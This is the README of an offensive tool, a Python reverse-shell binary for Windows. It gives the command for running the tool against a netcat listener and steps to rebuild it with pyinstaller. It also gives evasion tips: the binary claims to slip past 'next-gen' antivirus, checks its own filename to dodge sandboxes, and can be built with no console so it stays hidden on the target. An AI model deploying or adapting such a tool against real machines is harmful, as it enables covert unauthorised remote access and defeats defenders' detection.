# Overview
A simple binary to get reverse shells on Windows machines. Like netcat but unknown for now by "next-gen" AV (lol).

Simply execute the exe on the target box with two arguments as follows. First, set up a nc listener on your machine.
```
pyshell.exe <ip address> <port>
```

NOTE: There is a line in the code to look for the specific binary name as sys.argv(0). This is in hopes of avoiding some AV sandboxes. If you renamed the binary without building your own, it probably won't work.

# Building a new exe
You'll need to use a Windows host to generate the exe after modifying the Python source.

**Requirements**
- Python 3.x
- pyinstaller installed using `pip install pyinstaller`

**Building the exe**<br>
Run pyinstaller like the following to package the required DLLs:
```
pyinstaller -F pyshell.py
```
This should create a `dist` folder in your current directory with the new executable.

You can add the '--noconsole' swich when building to not display a console on the target. You can also hard-code the IP and Port into the Python script before building if you'd like a version that requires no arguments. Don't forget to get rid of argparse completely if you do so.

# Shout out
This thread: https://stackoverflow.com/questions/37991717/python-windows-reverse-shell-one-liner
